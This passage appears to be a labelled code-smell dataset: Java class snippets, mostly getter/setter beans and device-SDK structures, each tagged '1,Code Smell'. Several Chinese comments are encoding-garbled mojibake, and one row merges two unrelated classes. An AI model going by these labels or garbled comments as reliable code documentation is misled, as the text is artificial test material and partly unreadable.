  public int nHorizontalAngleMin;
  /** 
 * 姘村钩瑙掑害鑼冨洿鏈�澶у��,鍗曚綅:搴�
 */
  public int nHorizontalAngleMax;
  /** 
 * 鍨傜洿瑙掑害鑼冨洿鏈�灏忓��,鍗曚綅:搴�
 */
  public int nVerticalAngleMin;
  /** 
 * 鍨傜洿瑙掑害鑼冨洿鏈�澶у��,鍗曚綅:搴�
 */
  public int nVerticalAngleMax;
}",1,Code Smell
"public static class NET_IN_MANUAL_SNAP extends SdkStructure {
  public int dwSize;
  public int nChannel;
  public int nCmdSerial;
  public byte[] szFilePath=new byte[260];
  public NET_IN_MANUAL_SNAP(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * Contains implementations for default editor actions 
 */
public static class EditorActions {
  private final UndoManager undoManager;
  private final TextAction undo=new TextAction(""undo""){
    @Override public void actionPerformed(    ActionEvent e){
      if (undoManager != null && undoManager.canUndo()) {
        undoManager.undo();
      }
    }
  }
;
  private final TextAction redo=new TextAction(""redo""){
    @Override public void actionPerformed(    ActionEvent e){
      if (undoManager != null && undoManager.canRedo()) {
        undoManager.redo();
      }
    }
  }
;
  private final TextAction cut=new DefaultEditorKit.CutAction();
  private final TextAction copy=new DefaultEditorKit.CopyAction();
  private final TextAction paste=new DefaultEditorKit.PasteAction();
  private final TextAction delete=new TextAction(""delete""){
    @Override public void actionPerformed(    ActionEvent e){
      getTextComponent(e).replaceSelection("""");
    }
  }
;
  private final TextAction selectAll=new TextAction(DefaultEditorKit.selectAllAction){
    @Override public void actionPerformed(    ActionEvent e){
      getTextComponent(e).selectAll();
    }
  }
;
  public EditorActions(  UndoManager undoManager){
    this.undoManager=undoManager;
  }
  public TextAction getUndo(){
    return undo;
  }
  public TextAction getRedo(){
    return redo;
  }
  public TextAction getCut(){
    return cut;
  }
  public TextAction getCopy(){
    return copy;
  }
  public TextAction getPaste(){
    return paste;
  }
  public TextAction getDelete(){
    return delete;
  }
  public TextAction getSelectAll(){
    return selectAll;
  }
}
",1,Code Smell
"private static class ScoreAndDoc extends Scorable {
  public float score;
  public int docId;
  @Override public float score(){
    return score;
  }
  @Override public int docID(){
    return docId;
  }
}
private static class ScoreAndDoc extends Scorable {
  final int docid;
  final float score;
  ScoreAndDoc(  int docid,  float score){
    this.docid=docid;
    this.score=score;
  }
  @Override public int docID(){
    return docid;
  }
  @Override public float score(){
    return score;
  }
}
",1,Code Smell
"public static class PlayInfoBean {
  /** 
 * height : 270 width : 480 urlList : [{""name"":""aliyun"",""url"":""http://baobab.kaiyanapp.com/api/v1/playUrl?vid=153483&resourceType=video&editionType=low&source=aliyun&playUrlType=url_oss"",""size"":2665116},{""name"":""ucloud"",""url"":""http://baobab.kaiyanapp.com/api/v1/playUrl?vid=153483&resourceType=video&editionType=low&source=ucloud&playUrlType=url_oss"",""size"":2665116}] name : 娴佺晠 type : low url : http://baobab.kaiyanapp.com/api/v1/playUrl?vid=153483&resourceType=video&editionType=low&source=aliyun&playUrlType=url_oss
 */
  private int height;
  private int width;
  private String name;
  private String type;
  private String url;
  private List<UrlListBean> urlList;
  public int getHeight(){
    return height;
  }
  public void setHeight(  int height){
    this.height=height;
  }
  public int getWidth(){
    return width;
  }
  public void setWidth(  int width){
    this.width=width;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public List<UrlListBean> getUrlList(){
    return urlList;
  }
  public void setUrlList(  List<UrlListBean> urlList){
    this.urlList=urlList;
  }
public static class UrlListBean {
    /** 
 * name : aliyun url : http://baobab.kaiyanapp.com/api/v1/playUrl?vid=153483&resourceType=video&editionType=low&source=aliyun&playUrlType=url_oss size : 2665116
 */
    private String name;
    private String url;
    private int size;
    public String getName(){
      return name;
    }
    public void setName(    String name){
      this.name=name;
    }
    public String getUrl(){
      return url;
    }
    public void setUrl(    String url){
      this.url=url;
    }
    public int getSize(){
      return size;
    }
    public void setSize(    int size){
      this.size=size;
    }
  }
}",1,Code Smell
"public class CfLogisticsQueue implements Serializable {
  @JsonFormat(shape=JsonFormat.Shape.STRING) private Long id;
  @JsonFormat(shape=JsonFormat.Shape.STRING) private Long useLogId;
  private Short sortIndex;
  @JsonFormat(shape=JsonFormat.Shape.STRING) private Long logisticsStorehouseId;
  @JsonFormat(shape=JsonFormat.Shape.STRING) private Long logisticsPlatformId;
  private static final long serialVersionUID=1L;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Long getUseLogId(){
    return useLogId;
  }
  public void setUseLogId(  Long useLogId){
    this.useLogId=useLogId;
  }
  public Short getSortIndex(){
    return sortIndex;
  }
  public void setSortIndex(  Short sortIndex){
    this.sortIndex=sortIndex;
  }
  public Long getLogisticsStorehouseId(){
    return logisticsStorehouseId;
  }
  public void setLogisticsStorehouseId(  Long logisticsStorehouseId){
    this.logisticsStorehouseId=logisticsStorehouseId;
  }
  public Long getLogisticsPlatformId(){
    return logisticsPlatformId;
  }
  public void setLogisticsPlatformId(  Long logisticsPlatformId){
    this.logisticsPlatformId=logisticsPlatformId;
  }
}",1,Code Smell
"public static class ALARM_ARMMODE_CHANGE_INFO extends SdkStructure {
  public int dwSize;
  public NET_TIME stuTime;
  public int bArm;
  public int emSceneMode;
  public int dwID;
  public int emTriggerMode;
  public byte[] szNetClientAddr=new byte[64];
  public int nUserCode;
  public ALARM_ARMMODE_CHANGE_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"public class JWTConfigurationPayload implements ReflectMapWriter {
  @JsonProperty public Boolean blockUnknown;
  @JsonProperty public String principalClaim;
  @JsonProperty public Boolean requireExp;
  @JsonProperty public List<String> algAllowlist;
  @JsonProperty public Long jwkCacheDur;
  @JsonProperty public Map<String,Object> claimsMatch;
  @JsonProperty public String scope;
  @JsonProperty public String realm;
  @JsonProperty public String rolesClaim;
  @JsonProperty public String adminUiScope;
  @JsonProperty public List<String> redirectUris;
  @JsonProperty public Boolean requireIss;
  @JsonProperty public List<Issuer> issuers;
  @JsonProperty public String trustedCertsFile;
  @JsonProperty public List<String> trustedCerts;
  @JsonProperty public String name;
  @JsonProperty public List<String> jwksUrl;
  @JsonProperty public Map<String,Object> jwk;
  @JsonProperty public String iss;
  @JsonProperty public String aud;
  @JsonProperty public String wellKnownUrl;
  @JsonProperty public String authorizationEndpoint;
  @JsonProperty public String clientId;
public static class Issuer implements ReflectMapWriter {
    @JsonProperty public String name;
    @JsonProperty public String wellKnownUrl;
    @JsonProperty public String clientId;
    @JsonProperty public List<String> jwksUrl;
    @JsonProperty public Map<String,Object> jwk;
    @JsonProperty public String iss;
    @JsonProperty public String aud;
    @JsonProperty public String authorizationEndpoint;
  }
}
",1,Code Smell
"public static class LayoutBuildResult {
  public final ArrayList<Representation> representations=new ArrayList<>();
  public final float maxLineSize;
  public final int linesCount;
  public final boolean hasClassicEmoji;
  private LayoutBuildResult(  ArrayList<Item> items,  float maxRowSize,  float spaceSize){
    float currentX=0;
    float maxRowSizeReal=0;
    boolean hasClassicEmoji=false;
    int currentRow=0;
    for (    Item item : items) {
      if (item.type == Item.SPACE) {
        currentX+=spaceSize;
      }
 else       if (item.type == Item.LINE_BREAK) {
        currentX=0;
        currentRow+=1;
      }
 else       if (item.type == Item.EMOJI) {
        hasClassicEmoji|=item.customEmojiId == 0;
        if ((currentX + 1f) > maxRowSize) {
          currentX=0;
          currentRow+=1;
        }
        representations.add(new Representation(item.emoji,item.customEmojiId,currentX,currentRow));
        currentX+=1f;
        maxRowSizeReal=Math.max(maxRowSizeReal,currentX);
      }
    }
    this.hasClassicEmoji=hasClassicEmoji;
    this.maxLineSize=maxRowSizeReal;
    this.linesCount=currentRow + 1;
  }
}",1,Code Smell
"public static class HostPoint implements Serializable {
  private final HostAddress address;
  @JSONField(name=""fingerprint"") private Fingerprint fingerprint;
  @JSONField(name=""unkown"") private boolean unkown;
  @JSONCreator public HostPoint(  @JSONField(name=""address"") HostAddress addr){
    this.address=addr;
  }
  public boolean isChanged(){
    return false;
  }
  public boolean isMatched(){
    return false;
  }
  public HostAddress getAddress(){
    return address;
  }
  public Fingerprint getFingerprint(){
    return fingerprint;
  }
  public void setFingerprint(  Fingerprint fingerprint){
    this.fingerprint=fingerprint;
  }
  public boolean isUnkown(){
    return unkown;
  }
  public void setUnkown(  boolean unkown){
    this.unkown=unkown;
  }
}
",1,Code Smell
"public static class FooterFields {
  public Submit submit;
  public Pay pay;
  public CheckAll checkAll;
  public Quantity quantity;
}
",1,Code Smell
"public static class NET_UAVCMD_NAV_WAYPOINT extends SdkStructure {
  public NET_UAVCMD_COMMON stuCommon;
  public int nHoldTime;
  public float fAcceptanceRadius;
  public float fLatitude;
  public float fLongitude;
  public float fAltitude;
  public byte[] byReserved=new byte[8];
}",1,Code Smell
"/** 
 * 浠ｇ爜鐢熸垚鐩稿叧閰嶇疆
 * @author ruoyi
 */
@Component @ConfigurationProperties(prefix=""gen"") public class GenConfig {
  /** 
 * 浣滆�� 
 */
  public static String author;
  /** 
 * 鐢熸垚鍖呰矾寰� 
 */
  public static String packageName;
  /** 
 * 鑷姩鍘婚櫎琛ㄥ墠缂�锛岄粯璁ゆ槸false 
 */
  public static boolean autoRemovePre;
  /** 
 * 琛ㄥ墠缂�(绫诲悕涓嶄細鍖呭惈琛ㄥ墠缂�) 
 */
  public static String tablePrefix;
  public static String getAuthor(){
    return author;
  }
  public void setAuthor(  String author){
    GenConfig.author=author;
  }
  public static String getPackageName(){
    return packageName;
  }
  public void setPackageName(  String packageName){
    GenConfig.packageName=packageName;
  }
  public static boolean getAutoRemovePre(){
    return autoRemovePre;
  }
  public void setAutoRemovePre(  boolean autoRemovePre){
    GenConfig.autoRemovePre=autoRemovePre;
  }
  public static String getTablePrefix(){
    return tablePrefix;
  }
  public void setTablePrefix(  String tablePrefix){
    GenConfig.tablePrefix=tablePrefix;
  }
}
",1,Code Smell
"/** 
 * @author 251823
 * @version 1.0
 * @description 閫氶亾淇℃伅
 * @date 2020/11/06
 */
public class NET_CHANNEL_CFG_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 涓婃姤鐨勭浉鏈虹紪鍙� 
 */
  public int nCameraNo;
  /** 
 * 杩涘彛鏂瑰悜 {@link EM_ENTRY_DIRECTION} 
 */
  public int emEntryDirection;
  /** 
 * 杩涘彛绫诲瀷 {@link EM_ENTRY_TYPE} 
 */
  public int[] emEntryType=new int[16];
  /** 
 * 杩涘彛绫诲瀷涓暟 
 */
  public int nRetEntryTypeNum;
  /** 
 * 杞﹂亾鍙� 
 */
  public int nLaneNo;
  /** 
 * 涓婃姤鐨勭浉鏈虹紪鍙凤紝鐢ㄦ埛鍒嗛厤鍐呭瓨,int绫诲瀷 
 */
  public Pointer pCameraNo;
  /** 
 * pCameraNo 涓暟 
 */
  public int nCameraCount;
  /** 
 * 杩斿洖鐨� pCameraNo 涓暟锛岃幏鍙栨椂鏈夋晥锛岃缃椂鏃犳晥 
 */
  public int nCameraCountRet;
  /** 
 * 淇濈暀瀛楄妭 
 */
  public byte[] byReserved=new byte[940];
}",1,Code Smell
"public static class EM_OPERATE_FACERECONGNITIONDB_TYPE {
  public static final int NET_FACERECONGNITIONDB_UNKOWN=0;
  public static final int NET_FACERECONGNITIONDB_ADD=1;
  public static final int NET_FACERECONGNITIONDB_DELETE=2;
  public static final int NET_FACERECONGNITIONDB_MODIFY=3;
  public static final int NET_FACERECONGNITIONDB_DELETE_BY_UID=4;
}",1,Code Smell
"/** 
 * A styling span for text emphasis marks. <p>These are pronunciation aids such as <a href=""https://www.w3.org/TR/jlreq/?lang=en#term.emphasis-dots"">Japanese boutens</a> which can be rendered using the <a href=""https://developer.mozilla.org/en-US/docs/Web/CSS/text-emphasis""> text-emphasis</a> CSS property.
 */
public final class TextEmphasisSpan implements LanguageFeatureSpan {
  /** 
 * The possible mark shapes that can be used. <p>One of: <ul> <li> {@link #MARK_SHAPE_NONE}<li> {@link #MARK_SHAPE_CIRCLE}<li> {@link #MARK_SHAPE_DOT}<li> {@link #MARK_SHAPE_SESAME}</ul>
 */
  @Documented @Retention(SOURCE) @Target(TYPE_USE) @IntDef({MARK_SHAPE_NONE,MARK_SHAPE_CIRCLE,MARK_SHAPE_DOT,MARK_SHAPE_SESAME}) public @interface MarkShape {}
  public static final int MARK_SHAPE_NONE=0;
  public static final int MARK_SHAPE_CIRCLE=1;
  public static final int MARK_SHAPE_DOT=2;
  public static final int MARK_SHAPE_SESAME=3;
  /** 
 * The possible mark fills that can be used. <p>One of: <ul> <li> {@link #MARK_FILL_UNKNOWN}<li> {@link #MARK_FILL_FILLED}<li> {@link #MARK_FILL_OPEN}</ul>
 */
  @Documented @Retention(SOURCE) @Target(TYPE_USE) @IntDef({MARK_FILL_UNKNOWN,MARK_FILL_FILLED,MARK_FILL_OPEN}) public @interface MarkFill {}
  public static final int MARK_FILL_UNKNOWN=0;
  public static final int MARK_FILL_FILLED=1;
  public static final int MARK_FILL_OPEN=2;
  /** 
 * The mark shape used for text emphasis. 
 */
  public @MarkShape int markShape;
  /** 
 * The mark fill for the text emphasis mark. 
 */
  public @MarkShape int markFill;
  /** 
 * The position of the text emphasis relative to the base text. 
 */
  public final @TextAnnotation.Position int position;
  public TextEmphasisSpan(  @MarkShape int shape,  @MarkFill int fill,  @TextAnnotation.Position int position){
    this.markShape=shape;
    this.markFill=fill;
    this.position=position;
  }
}",1,Code Smell
"public class OrderInfo implements Serializable {
  private LocalDateTime createTime;
  private Date updateTime;
  public LocalDateTime getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  LocalDateTime createTime){
    this.createTime=createTime;
  }
  public Date getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Date updateTime){
    this.updateTime=updateTime;
  }
}
",1,Code Smell
"/** 
 * Webhook configuration
 * @since 2023-03-02
 * @author xuezechao
 */
public class WebhookConfigImpl implements WebHookConfig {
  /** 
 * webhook id
 */
  private int id;
  /** 
 * webhook url
 */
  private String url;
  /** 
 * webhook name
 */
  private String name;
  /** 
 * webhook status
 */
  private boolean enable;
  @Override public void setUrl(  String url){
    this.url=url;
  }
  @Override public String getUrl(){
    return url;
  }
  @Override public void setName(  String name){
    this.name=name;
  }
  @Override public String getName(){
    return name;
  }
  @Override public void setEnable(  boolean enable){
    this.enable=enable;
  }
  @Override public boolean getEnable(){
    return enable;
  }
  @Override public int getId(){
    return id;
  }
  @Override public void setId(  int id){
    this.id=id;
  }
}",1,Code Smell
"public static class ALARM_VIDEO_BLIND_INFO extends SdkStructure {
  public int nAction;
  public int nChannelID;
  public double dbPTS;
  public NET_TIME_EX stuTime;
  public int nEventID;
  public NET_TIME_EX stuStartTime;
  public NET_GPS_STATUS_INFO stuGPS;
  public byte[] byReserved=new byte[1024];
}",1,Code Smell
"private static final class RemovedMessage {
  public final Handler handler;
  public final int what;
  public final Object object;
  public final long sequenceNumber;
  public RemovedMessage(  Handler handler,  int what,  Object object){
    this.handler=handler;
    this.what=what;
    this.object=object;
    this.sequenceNumber=sequenceNumberGenerator.get();
  }
}
",1,Code Smell
"public static class NETDEV_ENCLOSURE_CFG extends SdkStructure {
  public int unType;
  public byte[] bRegion=new byte[8];
  public int unId;
  public int unSpeedLimit;
  public int unPointNum;
  public GPS_POINT[] stPoints=(GPS_POINT[])new GPS_POINT().toArray(128);
  public byte[] szStationName=new byte[32];
  public byte bDisenable;
  public byte bShape;
  public byte bLimitType;
  public byte bAction;
  public int nLimitAltitude;
  public int nAlarmAltitude;
  public int unLimitRadius;
  public int unAlarmRadius;
  public byte[] reserved=new byte[12];
}",1,Code Smell
"public static class TestDTO {
  private String channel;
  private String txCode;
  public String getChannel(){
    return channel;
  }
  public void setChannel(  String channel){
    this.channel=channel;
  }
  public String getTxCode(){
    return txCode;
  }
  public void setTxCode(  String txCode){
    this.txCode=txCode;
  }
}
",1,Code Smell
"public class CfAccount implements Serializable {
  private String id;
  private String uid;
  private String scoreType;
  private BigDecimal balance;
  private Long freeze;
  private Byte type;
  private Long createTime;
  private static final long serialVersionUID=1L;
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id == null ? null : id.trim();
  }
  public String getUid(){
    return uid;
  }
  public void setUid(  String uid){
    this.uid=uid == null ? null : uid.trim();
  }
  public String getScoreType(){
    return scoreType;
  }
  public void setScoreType(  String scoreType){
    this.scoreType=scoreType == null ? null : scoreType.trim();
  }
  public BigDecimal getBalance(){
    return balance;
  }
  public void setBalance(  BigDecimal balance){
    this.balance=balance;
  }
  public Long getFreeze(){
    return freeze;
  }
  public void setFreeze(  Long freeze){
    this.freeze=freeze;
  }
  public Byte getType(){
    return type;
  }
  public void setType(  Byte type){
    this.type=type;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
}",1,Code Smell
"public static class NET_AIOP_PICTURE_HEAD extends Structure {
  public int dwSize;
  public NET_DVR_SYSTEM_TIME struTime=new NET_DVR_SYSTEM_TIME();
  public byte[] szPID=new byte[64];
  public int dwAIOPDataSize;
  public byte byStatus;
  public byte[] byRes1=new byte[3];
  public byte[] szMPID=new byte[64];
  public Pointer pBufferAIOPData;
  public int dwPresetIndex;
  public byte[] byRes=new byte[180];
}",1,Code Smell
"public class ForwardReference {
  private final Decorators decorators;
  private final int gcID;
  private DateTimeStamp startTime=null;
  private double duration=-1.0d;
  private GCCause gcCause=GCCause.UNKNOWN_GCCAUSE;
  private CPUSummary cpuSummary=null;
  ForwardReference(  Decorators decorators,  int id){
    this.gcID=id;
    this.decorators=decorators;
    this.startTime=decorators.getDateTimeStamp();
  }
  int getGcID(){
    return gcID;
  }
  void setStartTime(  DateTimeStamp startTime){
    this.startTime=startTime;
  }
  DateTimeStamp getStartTime(){
    return startTime;
  }
  public void setDuration(  double duration){
    this.duration=duration;
  }
  double getDuration(){
    return duration;
  }
  public void setGCCause(  GCCause cause){
    this.gcCause=cause;
  }
  GCCause getGCCause(){
    return this.gcCause;
  }
  void setCPUSummary(  CPUSummary summary){
    this.cpuSummary=summary;
  }
  CPUSummary getCPUSummary(){
    return this.cpuSummary;
  }
  public void add(  CPUSummary cpuSummary){
    this.cpuSummary=cpuSummary;
  }
  /** 
 * @return the decorators
 */
  Decorators getDecorators(){
    return decorators;
  }
}",1,Code Smell
"/** 
 * Defines Iris-specific chunk shader binding points. <p> NB: Make sure this doesn't collide with anything in  {@link me.jellysquid.mods.sodium.client.render.chunk.shader.ChunkShaderBindingPoints}
 */
public class IrisChunkShaderBindingPoints {
  public static final int ATTRIBUTE_POSITION_ID=1;
  public static final int ATTRIBUTE_COLOR=2;
  public static final int ATTRIBUTE_BLOCK_TEXTURE=3;
  public static final int ATTRIBUTE_LIGHT_TEXTURE=4;
  public static final int NORMAL=10;
  public static final int BLOCK_ID=11;
  public static final int MID_TEX_COORD=12;
  public static final int TANGENT=13;
  public static final int MID_BLOCK=14;
}",1,Code Smell
"@Data private static class TaskJobVO {
  public LocalTime publishTime;
  public LocalTime publishTime2;
  public LocalTime publishTime3;
  public LocalTime publishTime4;
}",1,Code Smell
"/** 
 * 鐧诲綍鐭俊鍙戦佽繑鍥炵粨鏋
 * @author yaoxing.gyx@alibaba-inc.com
 */
public class PrivateAccountLoginSmsResult implements Serializable {
  public static final long serialVersionUID=1L;
  private String aliyunId;
  private String phone;
  public String getAliyunId(){
    return aliyunId;
  }
  public void setAliyunId(  String aliyunId){
    this.aliyunId=aliyunId;
  }
  public String getPhone(){
    return phone;
  }
  public void setPhone(  String phone){
    this.phone=phone;
  }
}",1,Code Smell
"/** 
 * 浜ら�氱伅鐨勬寔缁椂闂达紝鏃堕棿鍗曚綅姣
 * @author 锛� 47040
 * @since 锛� Created in 2020/8/29 16:48
 */
public class NET_LIGHTPERIODS_INFO extends NetSDKLib.SdkStructure {
  /** 
 * 浜ら�氱伅绫诲瀷 鏋氫妇  {@link EM_TRFAFFIC_LIGHT_TYPE}
 */
  public int emType;
  /** 
 * 鐩磋鐏寔缁椂闂�
 */
  public int nStraight;
  /** 
 * 宸﹁浆鐏寔缁椂闂�
 */
  public int nTurnLeft;
  /** 
 * 鍙宠浆鐏寔缁椂闂�
 */
  public int nTurnRight;
  /** 
 * 鎺夊ご鐏寔缁椂闂�
 */
  public int nUTurn;
  /** 
 * 棰勭暀
 */
  public byte[] byReserved=new byte[60];
}",1,Code Smell
"public static class GroupPttDownResp extends RespCommon {
  public String domainV4V6;
  public ArrayList<ServerAddr> mIpList=new ArrayList<>();
  public ArrayList<ServerAddr> mIpv6List=new ArrayList<>();
  public boolean mIsHttps;
  public String urlPath;
}",1,Code Smell
"public class DownloadRequest {
  private String type;
  private String sourceId;
  private String fileType;
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public String getSourceId(){
    return sourceId;
  }
  public void setSourceId(  String sourceId){
    this.sourceId=sourceId;
  }
  public String getFileType(){
    return fileType;
  }
  public void setFileType(  String fileType){
    this.fileType=fileType;
  }
}
",1,Code Smell
"/** 
 * @Author harris
 */
public class EndpointNode implements Serializable {
  private String region;
  private String type;
  private String endpoint;
  public String getRegion(){
    return region;
  }
  public void setRegion(  String region){
    this.region=region;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public String getEndpoint(){
    return endpoint;
  }
  public void setEndpoint(  String endpoint){
    this.endpoint=endpoint;
  }
}
",1,Code Smell
"public static class NET_DVR_ACS_EVENT_COND extends Structure {
  public int dwSize;
  public int dwMajor;
  public int dwMinor;
  public NET_DVR_TIME struStartTime;
  public NET_DVR_TIME struEndTime;
  public byte[] byCardNo=new byte[ACS_CARD_NO_LEN];
  public byte[] byName=new byte[NAME_LEN];
  public byte byPicEnable;
  public byte byTimeType;
  public byte[] byRes2=new byte[2];
  public int dwBeginSerialNo;
  public int dwEndSerialNo;
  public int dwIOTChannelNo;
  public short wInductiveEventType;
  public byte bySearchType;
  public byte byEventAttribute;
  public byte[] szMonitorID=new byte[NET_SDK_MONITOR_ID_LEN];
  public byte[] byEmployeeNo=new byte[NET_SDK_EMPLOYEE_NO_LEN];
  public byte[] byRes=new byte[140];
}",1,Code Smell
"public class CloudNativeResultDTO extends CloudNativeResultWithBLOBs {
  private String critical;
  private String high;
  private String medium;
  private String low;
  private String unknown;
  private String configCritical;
  private String configHigh;
  private String configMedium;
  private String configLow;
  private String configUnknown;
  private String fail;
  private String warn;
  private String info;
  private String pass;
  private Long scanTime;
  public String getCritical(){
    return critical;
  }
  public void setCritical(  String critical){
    this.critical=critical;
  }
  public String getHigh(){
    return high;
  }
  public void setHigh(  String high){
    this.high=high;
  }
  public String getMedium(){
    return medium;
  }
  public void setMedium(  String medium){
    this.medium=medium;
  }
  public String getLow(){
    return low;
  }
  public void setLow(  String low){
    this.low=low;
  }
  public String getUnknown(){
    return unknown;
  }
  public void setUnknown(  String unknown){
    this.unknown=unknown;
  }
  public String getConfigCritical(){
    return configCritical;
  }
  public void setConfigCritical(  String configCritical){
    this.configCritical=configCritical;
  }
  public String getConfigHigh(){
    return configHigh;
  }
  public void setConfigHigh(  String configHigh){
    this.configHigh=configHigh;
  }
  public String getConfigMedium(){
    return configMedium;
  }
  public void setConfigMedium(  String configMedium){
    this.configMedium=configMedium;
  }
  public String getConfigLow(){
    return configLow;
  }
  public void setConfigLow(  String configLow){
    this.configLow=configLow;
  }
  public String getConfigUnknown(){
    return configUnknown;
  }
  public void setConfigUnknown(  String configUnknown){
    this.configUnknown=configUnknown;
  }
  public String getFail(){
    return fail;
  }
  public void setFail(  String fail){
    this.fail=fail;
  }
  public String getWarn(){
    return warn;
  }
  public void setWarn(  String warn){
    this.warn=warn;
  }
  public String getInfo(){
    return info;
  }
  public void setInfo(  String info){
    this.info=info;
  }
  public String getPass(){
    return pass;
  }
  public void setPass(  String pass){
    this.pass=pass;
  }
  public Long getScanTime(){
    return scanTime;
  }
  public void setScanTime(  Long scanTime){
    this.scanTime=scanTime;
  }
}
",1,Code Smell
"/** 
 * company: www.dtstack.com author: toutian create: 2019/10/22
 */
public class ZkConfig {
  private String nodeZkAddress;
  private String localAddress;
  private Map<String,String> security;
  public String getNodeZkAddress(){
    return nodeZkAddress;
  }
  public void setNodeZkAddress(  String nodeZkAddress){
    this.nodeZkAddress=nodeZkAddress;
  }
  public String getLocalAddress(){
    return localAddress;
  }
  public void setLocalAddress(  String localAddress){
    if (StringUtils.isBlank(localAddress)) {
      localAddress=String.format(""%s:%s"",AddressUtil.getOneIp(),""8090"");
    }
    this.localAddress=localAddress;
  }
  public Map<String,String> getSecurity(){
    return security;
  }
  public void setSecurity(  String securityStr){
    if (StringUtils.isBlank(securityStr)) {
      return;
    }
    this.security=JSONObject.parseObject(securityStr,Map.class);
  }
  public void setSecurity(  Map<String,String> security){
    this.security=security;
  }
}",1,Code Smell
"public static class NET_DVR_FACE_STATUS extends Structure {
  public int dwSize;
  public byte[] byCardNo=new byte[ACS_CARD_NO_LEN];
  public byte[] byErrorMsg=new byte[ERROR_MSG_LEN];
  public int dwReaderNo;
  public byte byRecvStatus;
  public byte[] byRes=new byte[131];
}",1,Code Smell
"public class UpdateStmt extends DmlStmt {
  private final TableName tableName;
  private final List<ColumnAssignment> assignments;
  private final List<Relation> fromRelations;
  private final Expr wherePredicate;
  private final List<CTERelation> commonTableExpressions;
  private final Set<String> assignmentColumns;
  private Table table;
  private QueryStatement queryStatement;
  private boolean usePartialUpdate;
  public UpdateStmt(  TableName tableName,  List<ColumnAssignment> assignments,  List<Relation> fromRelations,  Expr wherePredicate,  List<CTERelation> commonTableExpressions){
    this(tableName,assignments,fromRelations,wherePredicate,commonTableExpressions,NodePosition.ZERO);
  }
  public UpdateStmt(  TableName tableName,  List<ColumnAssignment> assignments,  List<Relation> fromRelations,  Expr wherePredicate,  List<CTERelation> commonTableExpressions,  NodePosition pos){
    super(pos);
    this.tableName=tableName;
    this.assignments=assignments;
    this.fromRelations=fromRelations;
    this.wherePredicate=wherePredicate;
    this.commonTableExpressions=commonTableExpressions;
    this.assignmentColumns=Sets.newHashSet();
    for (    ColumnAssignment each : assignments) {
      this.assignmentColumns.add(each.getColumn());
    }
    this.usePartialUpdate=false;
  }
  public boolean isAssignmentColumn(  String colName){
    return assignmentColumns.contains(colName);
  }
  @Override public TableName getTableName(){
    return tableName;
  }
  public List<ColumnAssignment> getAssignments(){
    return assignments;
  }
  public boolean assignmentsContainsParameter(){
    for (    ColumnAssignment assignment : assignments) {
      if (assignment.getExpr().contains(Parameter.class)) {
        return true;
      }
    }
    return false;
  }
  public List<Relation> getFromRelations(){
    return fromRelations;
  }
  public Expr getWherePredicate(){
    return wherePredicate;
  }
  public List<CTERelation> getCommonTableExpressions(){
    return commonTableExpressions;
  }
  public void setTable(  Table table){
    this.table=table;
  }
  public Table getTable(){
    return table;
  }
  public void setQueryStatement(  QueryStatement queryStatement){
    this.queryStatement=queryStatement;
  }
  public QueryStatement getQueryStatement(){
    return queryStatement;
  }
  public void setUsePartialUpdate(){
    this.usePartialUpdate=true;
  }
  public boolean usePartialUpdate(){
    return this.usePartialUpdate;
  }
  public <R,C>R accept(  AstVisitor<R,C> visitor,  C context){
    return visitor.visitUpdateStatement(this,context);
  }
}
",1,Code Smell
"public final class GProGuildInit {
  ArrayList<GProCategoryChannelIdList> categoryList;
  HashMap<Long,GProChannel> channelMap;
  long guildId;
  GProCategoryChannelIdList uncategorizedChannels;
  public GProGuildInit(){
    this.channelMap=new HashMap<>();
    this.uncategorizedChannels=new GProCategoryChannelIdList();
    this.categoryList=new ArrayList<>();
  }
  public ArrayList<GProCategoryChannelIdList> getCategoryList(){
    return this.categoryList;
  }
  public HashMap<Long,GProChannel> getChannelMap(){
    return this.channelMap;
  }
  public long getGuildId(){
    return this.guildId;
  }
  public GProCategoryChannelIdList getUncategorizedChannels(){
    return this.uncategorizedChannels;
  }
  public String toString(){
    return ""GProGuildInit{guildId="" + this.guildId + "",channelMap=""+ this.channelMap+ "",uncategorizedChannels=""+ this.uncategorizedChannels+ "",categoryList=""+ this.categoryList+ "",}"";
  }
  public GProGuildInit(  long j2,  HashMap<Long,GProChannel> hashMap,  GProCategoryChannelIdList gProCategoryChannelIdList,  ArrayList<GProCategoryChannelIdList> arrayList){
    this.channelMap=new HashMap<>();
    this.uncategorizedChannels=new GProCategoryChannelIdList();
    this.categoryList=new ArrayList<>();
    this.guildId=j2;
    this.channelMap=hashMap;
    this.uncategorizedChannels=gProCategoryChannelIdList;
    this.categoryList=arrayList;
  }
}",1,Code Smell
"/** 
 * Termux app core activity.
 */
public static final class TERMUX_ACTIVITY {
  /** 
 * Path to the working directory of the session which should be selected when the termux activity connects to the termux service. If no session's CWD is the given directory, a new session will be created with the given CWD.
 */
  public static final String EXTRA_SESSION_WORKING_DIR=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.session_cwd"";
  /** 
 * The name for the session.
 */
  public static final String EXTRA_SESSION_NAME=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.session_name"";
  /** 
 * Intent extra for if termux failsafe session needs to be started and is used by  {@link TERMUX_ACTIVITY} and {@link TERMUX_SERVICE#ACTION_STOP_SERVICE} 
 */
  public static final String EXTRA_FAILSAFE_SESSION=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.failsafe_session"";
  /** 
 * Intent action to make termux app notify user that a crash happened. 
 */
  public static final String ACTION_NOTIFY_APP_CRASH=TermuxConstants.TERMUX_PACKAGE_NAME + "".app.notify_app_crash"";
  /** 
 * Intent action to make termux reload its termux session styling 
 */
